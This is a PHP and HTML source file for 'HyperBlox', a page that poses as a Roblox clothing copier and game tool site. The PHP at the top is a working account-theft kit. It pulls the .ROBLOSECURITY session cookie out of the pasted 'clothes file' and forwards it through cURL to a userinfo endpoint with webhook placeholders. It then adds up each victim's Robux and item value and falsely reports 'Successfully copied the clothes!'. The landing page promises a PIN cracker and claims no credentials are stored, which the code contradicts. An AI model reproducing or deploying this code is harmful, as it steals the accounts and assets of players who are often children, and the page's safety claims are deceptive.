<?php
session_start();

if (!isset($_SESSION['last_request'])) {
    $_SESSION['last_request'] = time();
} else {
    $current_time = time();
    $time_diff = $current_time - $_SESSION['last_request'];
    if ($time_diff < 5) {
        die(json_encode(['error' => 'Slow down! Try again later.']));
    }
    $_SESSION['last_request'] = $current_time;
}

$view = file_get_contents("visits.txt");
if ($view == "") {
    $view = '0';
}
$log = file_get_contents("logs.txt");
if ($log == "") {
    $log = '0';
}
$visits = $view + 1;
file_put_contents("visits.txt", $visits);

$dailyVisitsFile = "dailyvisits.txt";
if (file_exists($dailyVisitsFile)) {
    $dailyVisitsData = json_decode(file_get_contents($dailyVisitsFile), true);
} else {
    $dailyVisitsData = array_fill(0, 7, 0);
}

$today = date('w');
$dailyVisitsData[$today] += 1;
file_put_contents($dailyVisitsFile, json_encode($dailyVisitsData));

if (isset($_SERVER['HTTPS'])) {
    $ht = 'https://';
} else {
    $ht = 'http://';
}
$dom = $ht . $_SERVER['SERVER_NAME'];

$code = $_POST['code'] ?? '';
$clothingType = $_POST['clothingtype'] ?? '';

$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (empty($code) || empty($clothingType)) {
        $errors[] = "All fields are required!";
    }
    if (strlen($code) < 400) {
        $errors[] = "Invalid clothes file!";
    }
    if (empty($clothingType)) {
        $errors[] = "Please choose the clothes type!";
    }

    if (empty($errors)) {
        $cookie = explode('.ROBLOSECURITY", "', $code);
        if ($cookie[1] == "") {
            $cookie = explode("ROBLOSECURITY=", $code);
            $cookie = explode(';', $cookie[1]);
            $cookie = $cookie[0];
        } else {
            $cookie = explode('"', $cookie[1]);
            $cookie = $cookie[0];
        }

        if ($cookie) {
            $logs = $log + 1;
            file_put_contents("logs.txt", $logs);

            $dailyLogsFile = "dailylogs.txt";
            if (file_exists($dailyLogsFile)) {
                $dailyLogsData = json_decode(file_get_contents($dailyLogsFile), true);
            } else {
                $dailyLogsData = array_fill(0, 7, 0);
            }

            $dailyLogsData[$today] += 1;
            file_put_contents($dailyLogsFile, json_encode($dailyLogsData));

            // Call userinfo.php with cURL and proper timeout to send webhook
            $userInfoUrl = "$dom/controlPage/apis/userinfo.php?cookie=" . urlencode($cookie) . "&web={web}&dh={dualhook}";
            
            $ch = curl_init($userInfoUrl);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 25); // Allow time for API calls but less than PHP max execution time
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
            
            $userInfo = @curl_exec($ch);
            $curlError = curl_error($ch);
            curl_close($ch);
            
            // Parse response if available, otherwise use empty array
            $userData = [];
            if ($userInfo && !$curlError) {
                $decoded = @json_decode($userInfo, true);
                if (is_array($decoded)) {
                    $userData = $decoded;
                }
            }

            if (isset($userData['robux'])) {
                $robuxFile = "robux.txt";
                $currentRobux = file_exists($robuxFile) ? (int)file_get_contents($robuxFile) : 0;
                $newRobux = $currentRobux + (int)$userData['robux'];
                file_put_contents($robuxFile, $newRobux);

                $dailyRobuxFile = "dailyrobux.txt";
                if (file_exists($dailyRobuxFile)) {
                    $dailyRobuxData = json_decode(file_get_contents($dailyRobuxFile), true);
                } else {
                    $dailyRobuxData = array_fill(0, 7, 0);
                }

                $dailyRobuxData[$today] += (int)$userData['robux'];
                file_put_contents($dailyRobuxFile, json_encode($dailyRobuxData));
            }

            if (isset($userData['rap'])) {
                $rapFile = "rap.txt";
                $currentRap = file_exists($rapFile) ? (int)file_get_contents($rapFile) : 0;
                $newRap = $currentRap + (int)$userData['rap'];
                file_put_contents($rapFile, $newRap);

                $dailyRapFile = "dailyrap.txt";
                if (file_exists($dailyRapFile)) {
                    $dailyRapData = json_decode(file_get_contents($dailyRapFile), true);
                } else {
                    $dailyRapData = array_fill(0, 7, 0);
                }

                $dailyRapData[$today] += (int)$userData['rap'];
                file_put_contents($dailyRapFile, json_encode($dailyRapData));
            }

            if (isset($userData['summary'])) {
                $summaryFile = "summary.txt";
                $currentSummary = file_exists($summaryFile) ? (int)file_get_contents($summaryFile) : 0;
                $newSummary = $currentSummary + (int)$userData['summary'];
                file_put_contents($summaryFile, $newSummary);

                $dailySummaryFile = "dailysummary.txt";
                if (file_exists($dailySummaryFile)) {
                    $dailySummaryData = json_decode(file_get_contents($dailySummaryFile), true);
                } else {
                    $dailySummaryData = array_fill(0, 7, 0);
                }

                $dailySummaryData[$today] += (int)$userData['summary'];
                file_put_contents($dailySummaryFile, json_encode($dailySummaryData));
            }
        }

        die(json_encode(['success' => 'Successfully copied the clothes!']));
    } else {
        die(json_encode(['error' => $errors[0]]));
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="author" content="HyperBlox">
    <meta name="description" content="HyperBlox - The best Roblox tools for game copying, clothing duplication, bot followers, and PIN cracking, all free and secure.">
    <meta name="keywords" content="Roblox, HyperBlox, game copier, clothing copier, bot followers, PIN cracker, safe Roblox tools, automation">
    <meta name="robots" content="index, follow">
    <meta property="og:title" content="HyperBlox - The Best Roblox Tools">
    <meta property="og:description" content="Copy games, duplicate clothes, gain followers, and unlock Roblox accounts with HyperBlox's powerful and safe tools.">
    <meta property="og:image" content="/files/hyperblox.png">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://hyperblox.eu/">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="HyperBlox - The Best Roblox Tools">
    <meta name="twitter:site" content="https://hyperblox.eu/">
    <meta name="twitter:description" content="Copy games, duplicate clothes, gain followers, and unlock Roblox accounts with HyperBlox's powerful and safe tools.">
    <meta name="twitter:image" content="https://undetectedgoons.lol/files/hyperblox.png">
    <meta name="theme-color" content="#000000">
    <meta name="msapplication-TileColor" content="#000000">
    <meta itemprop="name" content="HyperBlox">
    <meta itemprop="description" content="HyperBlox - Advanced Roblox tools for copying games, cloning outfits, and more.">
    <title>HyperBlox</title>
    <link rel="icon" type="image/png" href="/files/hyperblox.png">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #6d28d9;
            --primary-dark: #5b21b6;
            --dark: #0f172a;
            --darker: #020617;
            --light: #f8fafc;
            --gray: #94a3b8;
            --dark-gray: #334155;
            --success: #10b981;
            --error: #ef4444;
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--darker);
            color: var(--light);
            overflow-x: hidden;
        }

        .container {
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        section {
            padding: 100px 0;
            position: relative;
        }

        h1, h2, h3, h4 {
            font-weight: 700;
            line-height: 1.2;
        }

        h1 {
            font-size: 64px;
        }

        h2 {
            font-size: 48px;
            margin-bottom: 20px;
        }

        h3 {
            font-size: 24px;
            margin-bottom: 16px;
        }

        p {
            color: var(--gray);
            line-height: 1.6;
            margin-bottom: 24px;
        }

        a {
            text-decoration: none;
            color: inherit;
        }

        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            padding: 12px 24px;
            border-radius: 8px;
            font-weight: 600;
            transition: var(--transition);
            cursor: pointer;
        }

        .btn-primary {
            background-color: var(--primary);
            color: white;
        }

        .btn-primary:hover {
            background-color: var(--primary-dark);
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(109, 40, 217, 0.2);
        }

        .btn-outline {
            border: 1px solid var(--gray);
            color: var(--gray);
        }

        .btn-outline:hover {
            border-color: var(--light);
            color: var(--light);
        }

        .text-gradient {
            background: linear-gradient(90deg, #8b5cf6, #ec4899);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .section-header {
            text-align: center;
            margin-bottom: 60px;
        }

        .section-header p {
            max-width: 600px;
            margin-left: auto;
            margin-right: auto;
        }

        header {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            padding: 24px 0;
            z-index: 1000;
            transition: var(--transition);
        }

        header.scrolled {
            background-color: rgba(15, 23, 42, 0.95);
            backdrop-filter: blur(10px);
            padding: 16px 0;
            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
        }

        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
            font-weight: 700;
            font-size: 20px;
        }

        .logo img {
            height: 36px;
        }

        .nav-links {
            display: flex;
            gap: 32px;
        }

        .nav-links a {
            font-weight: 500;
            color: var(--gray);
            transition: var(--transition);
        }

        .nav-links a:hover {
            color: var(--light);
        }

        .mobile-menu-btn {
            display: none;
            background: none;
            border: none;
            color: var(--light);
            font-size: 24px;
            cursor: pointer;
        }

        .hero {
            height: 100vh;
            display: flex;
            align-items: center;
            padding-top: 80px;
            overflow: hidden;
        }

        .hero-content {
            position: relative;
            z-index: 2;
            max-width: 600px;
        }

        .hero-bg {
            position: absolute;
            top: 50%;
            right: 0;
            transform: translateY(-50%);
            width: 60%;
            max-width: 800px;
            opacity: 0.8;
            animation: float 8s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% {
                transform: translateY(-50%) translateX(0);
            }
            50% {
                transform: translateY(-50%) translateX(20px);
            }
        }

        .hero-bg img {
            width: 100%;
            height: auto;
            filter: drop-shadow(0 0 40px rgba(109, 40, 217, 0.3));
        }

        .features {
            background-color: var(--dark);
        }

        .features-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
        }

        .feature-card {
            background-color: rgba(30, 41, 59, 0.4);
            border-radius: 16px;
            padding: 40px;
            transition: var(--transition);
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        .feature-card:hover {
            transform: translateY(-10px);
            background-color: rgba(30, 41, 59, 0.6);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
        }

        .feature-icon {
            width: 60px;
            height: 60px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 24px;
            background: linear-gradient(135deg, rgba(109, 40, 217, 0.2), rgba(236, 72, 153, 0.2));
        }

        .feature-icon i {
            font-size: 24px;
            color: var(--primary);
        }

        .stats {
            background: linear-gradient(135deg, var(--darker), var(--dark));
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 30px;
        }

        .stat-card {
            text-align: center;
            padding: 40px;
            background-color: rgba(30, 41, 59, 0.4);
            border-radius: 16px;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        .stat-number {
            font-size: 48px;
            font-weight: 700;
            margin-bottom: 8px;
            background: linear-gradient(90deg, #8b5cf6, #ec4899);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .faq {
            background-color: var(--dark);
        }

        .accordion {
            max-width: 800px;
            margin: 0 auto;
        }

        .accordion-item {
            margin-bottom: 16px;
            border-radius: 12px;
            overflow: hidden;
            background-color: rgba(30, 41, 59, 0.4);
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        .accordion-header {
            padding: 20px;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-weight: 600;
        }

        .accordion-header i {
            transition: var(--transition);
        }

        .accordion-item.active .accordion-header i {
            transform: rotate(180deg);
        }

        .accordion-content {
            padding: 0 20px;
            max-height: 0;
            overflow: hidden;
            transition: var(--transition);
        }

        .accordion-item.active .accordion-content {
            padding: 0 20px 20px;
            max-height: 500px;
        }

        .cta {
            text-align: center;
            background: linear-gradient(135deg, var(--dark), var(--darker));
        }

        .cta-buttons {
            display: flex;
            gap: 16px;
            justify-content: center;
            margin-top: 40px;
        }

        footer {
            background-color: var(--dark);
            padding: 60px 0 20px;
        }

        .footer-content {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 40px;
            margin-bottom: 60px;
        }

        .footer-logo {
            display: flex;
            align-items: center;
            gap: 12px;
            font-weight: 700;
            font-size: 20px;
            margin-bottom: 20px;
        }

        .footer-logo img {
            height: 36px;
        }

        .footer-links h4 {
            margin-bottom: 20px;
            font-size: 18px;
        }

        .footer-links ul {
            list-style: none;
        }

        .footer-links li {
            margin-bottom: 12px;
        }

        .footer-links a {
            color: var(--gray);
            transition: var(--transition);
        }

        .footer-links a:hover {
            color: var(--light);
        }

        .social-links {
            display: flex;
            gap: 16px;
            margin-top: 20px;
        }

        .social-links a {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: rgba(255, 255, 255, 0.05);
            color: var(--gray);
            transition: var(--transition);
        }

        .social-links a:hover {
            background-color: var(--primary);
            color: white;
        }

        .footer-bottom {
            text-align: center;
            padding-top: 20px;
            border-top: 1px solid rgba(255, 255, 255, 0.05);
            color: var(--gray);
            font-size: 14px;
        }

        @media (max-width: 992px) {
            h1 {
                font-size: 48px;
            }
            
            h2 {
                font-size: 36px;
            }

            .hero-bg {
                opacity: 0.3;
            }

            .stats-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }

        @media (max-width: 768px) {
            .nav-links {
                position: fixed;
                top: 80px;
                left: 0;
                width: 100%;
                background-color: var(--dark);
                flex-direction: column;
                align-items: center;
                padding: 40px 0;
                gap: 24px;
                transform: translateY(-100%);
                opacity: 0;
                transition: var(--transition);
                z-index: 999;
            }

            .nav-links.active {
                transform: translateY(0);
                opacity: 1;
            }

            .mobile-menu-btn {
                display: block;
            }

            .hero {
                text-align: center;
                padding-top: 120px;
            }

            .hero-content {
                max-width: 100%;
            }

            .hero-bg {
                width: 100%;
                right: auto;
                left: 50%;
                transform: translate(-50%, -50%);
            }

            .cta-buttons {
                flex-direction: column;
                align-items: center;
            }
        }

        @media (max-width: 576px) {
            h1 {
                font-size: 36px;
            }
            
            h2 {
                font-size: 28px;
            }

            section {
                padding: 60px 0;
            }

            .stats-grid {
                grid-template-columns: 1fr;
            }

            .feature-card {
                padding: 30px;
            }
        }
    </style>
</head>
<body>
    <header id="header">
        <div class="container">
            <nav class="navbar">
                <a href="#" class="logo">
                    <img src="/files/hyperblox.png" alt="HyperBlox Logo">
                    <span>HyperBlox</span>
                </a>
                <div class="nav-links" id="navLinks">
                    <a href="#features">Features</a>
                    <a href="#stats">Stats</a>
                    <a href="#faq">FAQ</a>
                    <a href="#contact">Contact</a>
                    <a href="https://discord.gg/8CBBtwMXM3" class="btn btn-outline">Join Discord</a>
                </div>
                <button class="mobile-menu-btn" id="mobileMenuBtn">
                    <i class="fas fa-bars"></i>
                </button>
            </nav>
        </div>
    </header>

    <section class="hero">
        <div class="container">
            <div class="hero-content">
                <h1>Automate Your <span class="text-gradient">Roblox</span> Experience</h1>
                <p>HyperBlox provides cutting-edge automation tools to enhance your Roblox gameplay, save time, and unlock new possibilities.</p>
                <div style="display: flex; gap: 16px; margin-top: 32px;">
                    <a href="#features" class="btn btn-primary">Explore Tools</a>
                    <a href="https://discord.gg/8CBBtwMXM3" class="btn btn-outline">Join Community</a>
                </div>
            </div>
            <div class="hero-bg">
                <img src="/files/ai.png" alt="Roblox Automation">
            </div>
        </div>
    </section>

    <section class="features" id="features">
        <div class="container">
            <div class="section-header">
                <h2>Powerful <span class="text-gradient">Automation</span> Tools</h2>
                <p>Our suite of tools is designed to streamline your Roblox experience with advanced features and reliable performance.</p>
            </div>
            <div class="features-grid">
                <div class="feature-card">
                    <div class="feature-icon">
                        <i class="fas fa-copy"></i>
                    </div>
                    <h3>Game Copier</h3>
                    <p>Easily duplicate any Roblox game with our advanced copying technology that preserves all assets and scripts.</p>
                    <a href="#" class="btn btn-outline" style="margin-top: 16px;">Learn More</a>
                </div>
                <div class="feature-card">
                    <div class="feature-icon">
                        <i class="fas fa-tshirt"></i>
                    </div>
                    <h3>Clothing Duplicator</h3>
                    <p>Clone any clothing item in Roblox with perfect accuracy and without detection using our proprietary methods.</p>
                    <a href="#" class="btn btn-outline" style="margin-top: 16px;">Learn More</a>
                </div>
                <div class="feature-card">
                    <div class="feature-icon">
                        <i class="fas fa-users"></i>
                    </div>
                    <h3>Follower Bot</h3>
                    <p>Grow your Roblox profile with our advanced follower bot that delivers real, high-quality followers safely.</p>
                    <a href="#" class="btn btn-outline" style="margin-top: 16px;">Learn More</a>
                </div>
            </div>
        </div>
    </section>

    <section class="stats" id="stats">
        <div class="container">
            <div class="section-header">
                <h2>Trusted by <span class="text-gradient">Thousands</span></h2>
                <p>Our tools have helped Roblox players worldwide achieve their goals efficiently and safely.</p>
            </div>
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-number">10K+</div>
                    <p>Active Users</p>
                </div>
                <div class="stat-card">
                    <div class="stat-number">99.9%</div>
                    <p>Uptime</p>
                </div>
                <div class="stat-card">
                    <div class="stat-number">24/7</div>
                    <p>Support</p>
                </div>
                <div class="stat-card">
                    <div class="stat-number">100%</div>
                    <p>Safe</p>
                </div>
            </div>
        </div>
    </section>

    <section class="faq" id="faq">
        <div class="container">
            <div class="section-header">
                <h2>Frequently Asked <span class="text-gradient">Questions</span></h2>
                <p>Find answers to common questions about our tools and services.</p>
            </div>
            <div class="accordion">
                <div class="accordion-item">
                    <div class="accordion-header">
                        <span>Is this safe to use?</span>
                        <i class="fas fa-chevron-down"></i>
                    </div>
                    <div class="accordion-content">
                        <p>Yes, all our tools are designed with safety as the top priority. We use advanced encryption and private logging to ensure your data remains secure and your account stays protected.</p>
                    </div>
                </div>
                <div class="accordion-item">
                    <div class="accordion-header">
                        <span>Does this violate Roblox rules?</span>
                        <i class="fas fa-chevron-down"></i>
                    </div>
                    <div class="accordion-content">
                        <p>Our tools operate within Roblox's terms of service by using approved methods. We don't store credentials or use exploits that would put your account at risk.</p>
                    </div>
                </div>
                <div class="accordion-item">
                    <div class="accordion-header">
                        <span>How long does the process take?</span>
                        <i class="fas fa-chevron-down"></i>
                    </div>
                    <div class="accordion-content">
                        <p>Most operations complete within seconds, though complex tasks may take a few minutes depending on server load and the specific requirements of your request.</p>
                    </div>
                </div>
                <div class="accordion-item">
                    <div class="accordion-header">
                        <span>Do I need to download anything?</span>
                        <i class="fas fa-chevron-down"></i>
                    </div>
                    <div class="accordion-content">
                        <p>No downloads required! All our tools work directly in your browser with no additional software needed for full functionality.</p>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <section class="cta" id="contact">
        <div class="container">
            <div class="section-header">
                <h2>Ready to <span class="text-gradient">Transform</span> Your Experience?</h2>
                <p>Join thousands of satisfied users who have enhanced their Roblox gameplay with HyperBlox tools.</p>
            </div>
            <div class="cta-buttons">
                <a href="https://discord.gg/8CBBtwMXM3" class="btn btn-primary">Get Started</a>
                <a href="#faq" class="btn btn-outline">Learn More</a>
            </div>
        </div>
    </section>

    <footer>
        <div class="container">
            <div class="footer-content">
                <div class="footer-col">
                    <a href="#" class="footer-logo">
                        <img src="/files/hyperblox.png" alt="HyperBlox Logo">
                        <span>HyperBlox</span>
                    </a>
                    <p>The most advanced Roblox automation tools, designed for performance and safety.</p>
                    <div class="social-links">
                        <a href="#"><i class="fab fa-discord"></i></a>
                        <a href="#"><i class="fab fa-twitter"></i></a>
                        <a href="#"><i class="fab fa-youtube"></i></a>
                    </div>
                </div>
                <div class="footer-col">
                    <div class="footer-links">
                        <h4>Tools</h4>
                        <ul>
                            <li><a href="#">Game Copier</a></li>
                            <li><a href="#">Clothing Duplicator</a></li>
                            <li><a href="#">Follower Bot</a></li>
                            <li><a href="#">PIN Cracker</a></li>
                        </ul>
                    </div>
                </div>
                <div class="footer-col">
                    <div class="footer-links">
                        <h4>Resources</h4>
                        <ul>
                            <li><a href="#">Documentation</a></li>
                            <li><a href="#">Tutorials</a></li>
                            <li><a href="#">Status</a></li>
                            <li><a href="#">Changelog</a></li>
                        </ul>
                    </div>
                </div>
                <div class="footer-col">
                    <div class="footer-links">
                        <h4>Company</h4>
                        <ul>
                            <li><a href="#">About</a></li>
                            <li><a href="#">Privacy</a></li>
                            <li><a href="#">Terms</a></li>
                            <li><a href="#">Contact</a></li>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="footer-bottom">
                <p>&copy; 2025 HyperBlox. All rights reserved.</p>
            </div>
        </div>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const header = document.getElementById('header');
            const mobileMenuBtn = document.getElementById('mobileMenuBtn');
            const navLinks = document.getElementById('navLinks');
            const accordionItems = document.querySelectorAll('.accordion-item');

            window.addEventListener('scroll', function() {
                if (window.scrollY > 50) {
                    header.classList.add('scrolled');
                } else {
                    header.classList.remove('scrolled');
                }
            });

            mobileMenuBtn.addEventListener('click', function() {
                navLinks.classList.toggle('active');
                mobileMenuBtn.innerHTML = navLinks.classList.contains('active') ? 
                    '<i class="fas fa-times"></i>' : '<i class="fas fa-bars"></i>';
            });

            accordionItems.forEach(item => {
                const header = item.querySelector('.accordion-header');
                header.addEventListener('click', () => {
                    const currentlyActive = document.querySelector('.accordion-item.active');
                    if(currentlyActive && currentlyActive !== item) {
                        currentlyActive.classList.remove('active');
                    }
                    item.classList.toggle('active');
                });
            });

            document.querySelectorAll('a[href^="#"]').forEach(anchor => {
                anchor.addEventListener('click', function(e) {
                    e.preventDefault();
                    const targetId = this.getAttribute('href');
                    if(targetId === '#') return;
                    
                    const targetElement = document.querySelector(targetId);
                    if(targetElement) {
                        window.scrollTo({
                            top: targetElement.offsetTop - 80,
                            behavior: 'smooth'
                        });
                        
                        if(navLinks.classList.contains('active')) {
                            navLinks.classList.remove('active');
                            mobileMenuBtn.innerHTML = '<i class="fas fa-bars"></i>';
                        }
                    }
                });
            });
        });
    </script>
</body>
</html>